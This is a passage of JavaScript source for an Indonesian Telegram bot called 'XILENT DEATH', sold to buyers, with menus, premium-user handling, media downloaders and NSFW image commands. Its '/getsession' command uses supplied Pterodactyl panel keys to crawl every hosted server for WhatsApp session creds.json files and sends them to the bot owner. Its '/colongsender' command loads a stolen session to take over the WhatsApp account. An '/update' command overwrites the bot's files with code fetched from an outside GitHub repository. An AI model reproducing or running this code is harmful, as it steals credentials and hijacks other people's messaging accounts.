                text: "⌜🔙⌟ Back Aja Njierr", callback_data: "/bug", style: "Success"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                caption: bug3Menu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const bug3Menu = `
<blockquote><b>━═「 ＸＩＬＥＮＴ ＤＥＡＴＨ 」═━</b></blockquote>
Lucifer Loli ↯ L Iblis
  ╰┈➤ @synt4xtrdx
Zoya ↯ Gtw Siapa
  ╰┈➤ @zoyaajembot2
Ekik ↯ Gtw Juga Siapa
  ╰┈➤ @ekikjembot2
Nando ↯ Teacher Pelit
  ╰┈➤ @NandoOfficiali
Otax ↯ Teacher
  ╰┈➤ Ilanggg
Xatanical ↯ Teacher
  ╰┈➤ @Xatanicvxii
Donz ↯ Lau Siapa Mpruy
  ╰┈➤ @donzxx1830
<blockquote><b>⚘Ty For All Buyer Script</b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back To Menu",
                callback_data: "/start",
                style: "Danger"
            },
            {
                text: "⌜🔙⌟ Tqto 2", callback_data: "/tqton", style: "Success"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                caption: bug3Menu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/tqton', async (ctx) => {
    const tqtoMenu = `
<blockquote><b>━═「 ＸＩＬＥＮＴ ＤＥＡＴＨ 」═━</b></blockquote>
Gapon ↯ Creator
  ╰┈➤ @GaponReal
Relz ↯ Puqi
  ╰┈➤ @RelzzTyz
Vixz ↯ Puqi Juga 
  ╰┈➤ @vixzzofc
Caeser ↯ Tambah Puqi
  ╰┈➤ @CAEESIR  
Manx ↯ Support
  ╰┈➤ @manxofficial
Xwar ↯ Support
  ╰┈➤ @xwarrxxx
<blockquote><b>⚘Ty For All Buyer Script</b></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ Back To Tqto",
                callback_data: "/tqtp",
                style: "Danger"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: tqtoUrl,
                caption: tqtoMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

//------------ CASE TOOLS ---------------//
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    
    console.log(`[CALLBACK] Received: ${data} from user: ${ctx.from.id}`);
    
    if (data.startsWith('addprem_')) {
        console.log('[CALLBACK] Processing addprem button...');
        
        // GANTI INI: dari ownerID ke isAdminUser
        if (!isAdminUser(ctx.from.id)) {
            console.log(`[CALLBACK] User ${ctx.from.id} is not admin`);
            await ctx.answerCbQuery("❌ Akses ditolak", { show_alert: true });
            return;
        }
        
        const parts = data.split('_');
        if (parts.length < 3) {
            console.log('[CALLBACK] Invalid data format');
            await ctx.answerCbQuery("❌ Data tidak valid", { show_alert: true });
            return;
        }
        
        const userId = parts[1];
        const duration = parseInt(parts[2]);
        
        console.log(`[CALLBACK] Adding premium: ${userId} for ${duration} days`);
        
        // Proses add premium
        const expiryDate = addPremiumUser(userId, duration);
        
        // Edit pesan asli untuk hapus tombol
        try {
            await ctx.editMessageText(
                `✅ <b>Premium Berhasil Ditambahkan</b>\n` +
                `• User: <code>${userId}</code>\n` +
                `• Durasi: ${duration} hari\n` +
                `• Berakhir: ${expiryDate}`,
                { 
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [] }
                }
            );
            console.log('[CALLBACK] Message edited successfully');
        } catch (error) {
            console.error('[CALLBACK] Error editing message:', error);
            // Coba kasih feedback ke user
            try {
                await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
            } catch (e) {}
            return;
        }
        
        await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
        console.log('[CALLBACK] Callback answered');
        
        // Beri notifikasi ke user
        try {
            await ctx.telegram.sendMessage(
                userId,
                `🎉 <b>Selamat!</b>\n` +
                `Anda sekarang pengguna Premium XILENT DEATH!\n` +
                `• Durasi: ${duration} hari\n` +
                `• Berakhir: ${expiryDate}`,
                { parse_mode: "HTML" }
            );
            console.log(`[CALLBACK] Notification sent to ${userId}`);
        } catch (error) {
            console.log('[CALLBACK] Cannot send notification to user:', error.message);
        }
        
        console.log('[CALLBACK] Process completed');
    }
    
    // CALLBACK TIKTOK MEK
    
    else if (data.startsWith("tiktok_download|")) {
    const parts = data.split("|");
    const type = parts.pop(); // Ambil elemen terakhir (video/hd/audio)
const url = parts.slice(1).join("|"); // Gabungkan kembali sisa bagian URL
    
    // Konfirmasi pemrosesan
    await ctx.answerCbQuery("⏳ Memproses permintaan...");
    
    // Edit pesan untuk menampilkan status
    await ctx.editMessageText(`⏳ Sedang memproses ${getTypeName(type)}...`);
    
    try {
      const result = await downloadTikTok(url, type);
      
      if (result.success) {
        // Kirim file sesuai tipe
        if (type === 'audio') {
          await ctx.replyWithAudio(
            { source: Buffer.from(result.data), filename: 'tiktok_audio.mp3' },
            { title: 'TikTok Audio', performer: 'TikTok Downloader' }
          );
        } else {
          await ctx.replyWithVideo(
            { source: Buffer.from(result.data), filename: `tiktok_${type}.mp4` },
            { 
              supports_streaming: true,
              caption: `✅ Berhasil diunduh\n📁 Tipe: ${getTypeName(type)}`
            }
          );
        }
        
        // Hapus pesan status
        await ctx.deleteMessage();
        
      } else {
        await ctx.editMessageText(`❌ Gagal: ${result.error}`);
      }
      
    } catch (error) {
      await ctx.editMessageText(`❌ Error: ${error.message}`);
    }
  }

});


// AUTO UPDATE SPESIAL COY
//KHUSUS PENGGUNAAN PANEL PTERODACTYL 
// BY SANZOPE NO HAPUS CREDIT KONTOL
// TYPE TELEGRAF
const GH_OWNER = "ponzs212";
const GH_REPO = "pullupdate";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container", fileList = []) {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;
    
    const { data } = await axios.get(url, {
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));

            console.log("[UPDATE FILE]", item.path);
            fileList.push(item.path); // simpan nama file
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath, fileList);
        }
    }

    return fileList;
}

bot.command("update", checkAdmin, async (ctx) => {
    const chat = ctx.chat.id;
    await ctx.reply("🔄 Sedang Mengambil file... mohon tunggu");

    try {
        const files = await downloadRepo("");

        // Ambil beberapa file aja biar ga kepanjangan
        const preview = files.slice(0, 10).map(f => `📄 ${f}`).join("\n");

        await ctx.reply(
`✅ Update berhasil!

📂 Total file: ${files.length}

${preview}${files.length > 10 ? "\n..." : ""}

🔁 Restarting bot...`
        );

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

// spotifyplay
bot.command("spotifyplay", checkPremium, async (ctx) => {
  try {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    if (!input) {
      return ctx.reply("❌ Masukkan judul lagu atau link Spotify.\n\nContoh:\n/spotifyplay Hadroh Ramadhan Tiba");
    }

    const loading = await ctx.reply("🔍 Mencari lagu...");

    let spotifyUrl;

    if (input.includes("open.spotify.com")) {
      spotifyUrl = input;
    }

    else {
      const search = await axios.get(
        "https://ikyyzyyrestapi.my.id/search/spotify",
        {
          params: { query: input },
          timeout: 60000
        }
      );

      if (!search.data?.status || !search.data?.tracks?.length) {
        await ctx.deleteMessage(loading.message_id).catch(() => {});
        return ctx.reply("❌ Lagu tidak ditemukan.");
      }

      spotifyUrl = search.data.tracks[0].link;
    }

    const dl = await axios.get(
      "https://ikyyzyyrestapi.my.id/download/spotifydl",
      {
        params: {
          apikey: "kyzz",
          url: spotifyUrl
        },
        timeout: 120000
      }
    );

    await ctx.deleteMessage(loading.message_id).catch(() => {});

    if (!dl.data?.status) {
      return ctx.reply("❌ Gagal download lagu.");
    }

    const meta = dl.data.result.metadata;
    const audioUrl = dl.data.result.download;

    await ctx.replyWithPhoto(
      { url: meta.img },
      {
        caption:
`🎵 *${meta.song_name}*

👤 Artist: ${meta.artist}
💿 Album: ${meta.album_name}
⏱ Durasi: ${meta.duration}
📅 Rilis: ${meta.released}`,
        parse_mode: "Markdown"
      }
    );

    await ctx.replyWithAudio(
      { url: audioUrl },
      {
        title: meta.song_name,
        performer: meta.artist
      }
    );

  } catch (err) {
    console.error("Error SpotifyPlay:", err.response?.data || err.message || err);
    ctx.reply("❌ Terjadi kesalahan saat memproses lagu.");
  }
});


bot.command('iqc', async (ctx) => {
  try {
    const chatId = ctx.chat.id;

    // Ambil text setelah command
    const text = ctx.message.text.split(' ').slice(1).join(' ');

    if (!text) {
      return ctx.reply(
        "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
        { parse_mode: "Markdown" }
      );
    }

    let [time, battery, carrier, ...msgParts] = text.split("|");

    if (!time || !battery || !carrier || msgParts.length === 0) {
      return ctx.reply(
        "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
        { parse_mode: "Markdown" }
      );
    }

    await ctx.reply("⏳ Tunggu sebentar...");

    const messageText = encodeURIComponent(msgParts.join("|").trim());

    const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(carrier)}&messageText=${messageText}&emojiStyle=apple`;

    const res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    const arrayBuffer = await res.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: "✅ Nih hasilnya",
        parse_mode: "Markdown"
      }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan saat menghubungi API.");
  }
});

bot.command("videy", async (ctx) => {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    
    if (!input || !input.startsWith("http")) {
      return ctx.reply(
        "❌ Kirim perintah dengan menyertakan URL video dari videy.co\nContoh: `/videydl https://videy.co/v?id=XXXX`",
        { parse_mode: "Markdown" }
      );
    }

    await ctx.reply("⏳ Sedang memproses video...");

    try {
      const res = await axios.post(
        "https://fastapi.acodes.my.id/api/downloader/videy",
        { text: input },
        {
          headers: {
            accept: "*/*",
            "Content-Type": "application/json",
          },
        }
      );

      if (res.data?.status && res.data?.data) {
        await ctx.replyWithVideo(
          { url: res.data.data },
          { caption: "✅ Video berhasil diunduh dari videy.co!" }
        );
      } else {
        await ctx.reply("❌ Gagal mendapatkan video. Coba cek ulang link-nya.");
      }
    } catch (err) {
      console.error("VideyDL error:", err.message || err);
      ctx.reply("❌ Terjadi kesalahan saat memproses video.");
    }
  });
 
   bot.command("cekefek", async (ctx) => {
  const reply = ctx.message.reply_to_message?.text;
  if (!reply)
    return ctx.reply("⚠️ Balas ke potongan kode yang ingin dianalisa dengan /efekfunc.");

  await ctx.reply("🔎 Analisa cepat efek (simple) — tunggu sebentar...");

  // Deteksi efek / pola berbahaya
  let efek = "Tidak terdeteksi";
  let indikator = "Tidak ditemukan";
  let indikasiCuplikan = "";

  if (/fetch|axios|http|https|socket|ws|wss/i.test(reply)) {
    efek = "🌐 Exfiltrate / Network";
    indikator = "Mengirim / menerima data jaringan.";
  } else if (/crash|loop|repeat\(/i.test(reply)) {
    efek = "💣 Crash / Overload";
    indikator = "Loop besar atau operasi berat terdeteksi.";
  } else if (/child_process|exec|spawn/i.test(reply)) {
    efek = "⚙️ System Access / Command Injection";
    indikator = "Menjalankan perintah sistem.";
  } else if (/process\.kill|process\.exit/i.test(reply)) {
    efek = "🧨 Process Kill Attempt";
    indikator = "Upaya mematikan proses terdeteksi.";
  } else if (/atob|btoa|Buffer\.from/i.test(reply)) {
    efek = "🌀 Encoding / Obfuscation";
    indikator = "Kode menyembunyikan data atau base64 decode/encode.";
  }

  // Ambil cuplikan indikasi
  const lines = reply.split("\n");
  const foundIndex = lines.findIndex((l) =>
    l.match(/fetch|axios|http|repeat|exec|process|Buffer|btoa/i)
  );
  if (foundIndex >= 0) {
    indikasiCuplikan = lines
      .slice(Math.max(0, foundIndex - 1), foundIndex + 2)
      .join("\n");
  }

  await ctx.replyWithMarkdown(
    `🧠 *Analisa Efek (simple)*\n` +
    `📂 *Sumber:* Potongan teks (reply)\n\n` +
    `🔎 *Efek Teridentifikasi:* ${efek}\n` +
    `🔎 *Indikator yang ditemukan:* ${indikator}\n\n` +
    `📘 *Cuplikan (sekitar indikasi pertama):*\n\`\`\`js\n${indikasiCuplikan || "Tidak ditemukan indikasi mencurigakan"}\n\`\`\``
  );
});

bot.command('denc', checkPremium, async (ctx) => {
  if (!ctx.message.reply_to_message) return ctx.reply("🪧 ☇ Format: /decryptcode (reply javascript document)")
  const replied = ctx.message.reply_to_message
  if (!replied.document) return ctx.reply("❌ ☇ Pesan yang di reply bukan file")

  const fileName = replied.document.file_name || 'file.js'
  if (!fileName.endsWith('.js')) return ctx.reply("❌ ☇ File harus format .js")

  const MAX = 8 * 1024 * 1024
  if (replied.document.file_size > MAX) return ctx.reply("❌ ☇ File terlalu besar")

  const processing = await ctx.reply(`✅ ☇ Mengunduh dan memproses dekripsi ${fileName}`)

  try {
    const fileLink = await ctx.telegram.getFileLink(replied.document.file_id)
    const tmpDir = path.join(__dirname, 'temp')
    if (!fs.existsSync(tmpDir)) fs.mkdirSync(tmpDir)

    const tmpPath = path.join(tmpDir, fileName)
    const resp = await axios({ url: fileLink.href, method: 'GET', responseType: 'stream' })
    await pipeline(resp.data, createWriteStream(tmpPath))

    let code = fs.readFileSync(tmpPath, 'utf8')
    let deob = deobfuscatePipeline(code)

    if (deob.length < code.length / 2 || /\\x[0-9A-Fa-f]{2}/.test(deob)) {
      const dynamicPath = await deobfuscatePipelineDynamic(tmpPath)
      deob = fs.readFileSync(dynamicPath, 'utf8')
    }

    const outPath = tmpPath.replace(/\.js$/, '_void_decrypt.js')
    fs.writeFileSync(outPath, deob, 'utf8')

    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `✅ ☇ Selesai di dekripsi sedang mengirim ${path.basename(outPath)}`)
    await ctx.replyWithDocument({ source: outPath, filename: path.basename(outPath) })

    try { fs.unlinkSync(tmpPath); fs.unlinkSync(outPath) } catch(e){}
  } catch (err) {
    await ctx.telegram.editMessageText(ctx.chat.id, processing.message_id, undefined, `❌ ☇ Gagal mendekripsi karena error: ${err.message}`)
  }
});

bot.command("gethtml", async (ctx) => {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id;
  const url = ctx.message.text.split(' ')[1]; // Mengambil URL dari command

  // Validasi URL
  if (!url || !/^https?:\/\//i.test(url)) {
    return ctx.reply("🔗 *Masukkan domain atau URL yang valid!*\n\nContoh:\n`/gethtml https://example.com`", {
      parse_mode: "Markdown",
    });
  }

  try {
    await ctx.reply("⏳ Mengambil source code dari URL...");

    const res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ *Gagal mengambil source code dari URL tersebut!*");
    }

    const html = await res.text();
    const filePath = path.join(__dirname, "source_code.html");
    fs.writeFileSync(filePath, html);

    // Mengirim file sebagai document
    await ctx.replyWithDocument({
      source: filePath,
      filename: "source_code.html",
      contentType: "text/html"
    });

    fs.unlinkSync(filePath); // Hapus file setelah dikirim
    
  } catch (err) {
    console.error(err);
    ctx.reply(`❌ *Terjadi kesalahan:*\n\`${err.message}\``, {
      parse_mode: "Markdown",
    });
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Example\n/brat Reo Del Rey", { parse_mode: "Markdown" });

  try {
    // Kirim emoji reaksi manual
    await ctx.reply("✨ Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    // Optional: hapus file setelah kirim
    fs.unlinkSync(filePath);

  } catch (err) {
    console.error("Error brat:", err.message);
    ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

bot.command(["ytsearch", "youtubesearch"], async (ctx) => {
  const currentTime = Math.floor(Date.now() / 1000);
  const messageTime = ctx.message.date;

  if (currentTime - messageTime > 1) {
    return;
  }

  if (groupOnlyMode && !isGroup(ctx)) {
    return ctx.reply("bot hanya dapat digunakan didalam grup");
  }

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("Masukkan query parameters!");

  ctx.reply("🔍 Sedang mencari...");

  try {
    const anu = `https://api.diioffc.web.id/api/search/ytplay?query=${encodeURIComponent(
      text
    )}`;
    const { data: response } = await axios.get(anu);

    const url = response.result.url;
    const caption = `🎵 Title: ${response.result.title}\n📜 Description: ${response.result.description}\n👀 Views: ${response.result.views}`;

    ctx.reply(caption, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Download MP3", callback_data: `ytmp3 ${url}` }],
          [{ text: "Download MP4", callback_data: `ytmp4 ${url}` }],
        ],
      },
    });
  } catch (e) {
    console.error(e);
    ctx.reply("❌ Terjadi kesalahan!");
  }
});

bot.command("getsession", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /getsession https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("getnsfw", checkPremium, async (ctx) => {
  try {
    const nsfwTypes = [
      "hentai", "ass", "boobs", "paizuri", "thigh",
      "hanal", "hass", "pgif", "4k", "lewdneko", "lewdkitsune"
    ];
    
    const randomType = nsfwTypes[Math.floor(Math.random() * nsfwTypes.length)];

    const res = await fetchJsonHttps(`https://nekobot.xyz/api/image?type=${randomType}`);
    
    if (res && res.message) {
      await ctx.replyWithVideo(res.message, {
        caption: `✅ ☇ Gambar berhasil dibuat`
      });
    } else {
      ctx.reply("❌ ☇ Gagal membuat gambar");
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi kesalahan saat memuat gambar");
  }
});

bot.command("nsfwwaifu", checkPremium, async (ctx) => {
    // Hanya untuk pengguna premium
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'trap', 'blowjob'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply("❌ ☇ Kategori NSFW tidak valid");
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/nsfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><b>⬡═―—⊱ ⎧ NSFW WAIFU ⎭ ⊰―—═⬡</b></blockquote>🔞 Kategori: ${category}\n\n⚠️ Konten untuk dewasa`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar NSFW");
    }
});

bot.command("waifu", checkPremium, async (ctx) => {
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
    
    if (!validCategories.includes(category)) {
        return ctx.reply(`❌ ☇ Kategori tidak valid. Kategori yang tersedia: ${validCategories.slice(0, 10).join(', ')}...`);
    }

    try {
        const response = await axios.get(`https://api.waifu.pics/sfw/${category}`);
        
        await ctx.replyWithVideo(response.data.url, {
            caption: `<blockquote><b>⬡═―—⊱ ⎧ WAIFU IMAGE ⎭ ⊰―—═⬡</b></blockquote>🌸 Kategori: ${category}`,
            parse_mode: "HTML"
        });
    } catch (error) {
        await ctx.reply("❌ ☇ Gagal mengambil gambar waifu");
    }
});

bot.command('iqc', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
      return ctx.reply('Gunakan format:\n/iqc <pesan> <baterai> <operator>\n\nContoh:\n/iphone Halo dunia 87 Telkomsel');
    }

    // Gabung argumen, misalnya: [ 'Halo', 'dunia', '87', 'Telkomsel' ]
    const battery = args[args.length - 2];       // misal 87
    const carrier = args[args.length - 1];       // misal Telkomsel
    const text = args.slice(0, -2).join(' ');    // sisanya jadi pesan
    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

    await ctx.reply('⏳ Membuat quoted message gaya iPhone...');

    // 🔗 Build API URL
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

    // Ambil hasil gambar dari API
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');

    // Kirim gambar hasil API ke user
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
  } catch (err) {
    console.error('❌ Error case /iqc:', err);
    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
  }
});

bot.command('colongsender', async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;
  
  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');

  const doc = msg.reply_to_message?.document;
  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');

  const name = doc.file_name.toLowerCase();
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return ctx.reply('❌ File bukan session tolol.');

  await ctx.reply('🔄 Proses colong sender in you session…');

  const url = await bot.getFileLink(doc.file_id);
  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), data);
  } else if (name.endsWith('.zip')) {
    new AdmZip(data).extractAllTo(tmp, true);
  } else {
    const tmpTar = path.join(tmp, name);
    await fs.writeFile(tmpTar, data);
    await tar.x({ file: tmpTar, cwd: tmp });
  }

  const credsPath = await findCredsFile(tmp);
  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');

  const creds = await fs.readJson(credsPath);
  const botNumber = creds.me.id.split(':')[0];

  await fs.remove(destDir);
  await fs.copy(tmp, destDir);
  saveActiveSessions(botNumber);

  const auth = await useMultiFileAuthState(destDir);
  await connectToWhatsApp(botNumber, chatId, auth);

  return ctx.reply(`*SUCCES CONNECTING🫀*
  NUMBER : ${botNumber}
  *ANJAYYY KEMALING🗿*`);
});

bot.command("waifu", checkPremium, async (ctx) => {
    const category = ctx.message.text.split(" ")[1] || "waifu";

    const validCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'glomp', 'slap', 'kill', 'kick', 'happy', 'wink', 'poke', 'dance', 'cringe'];
    
    if (!validCategories.includes(category)) {
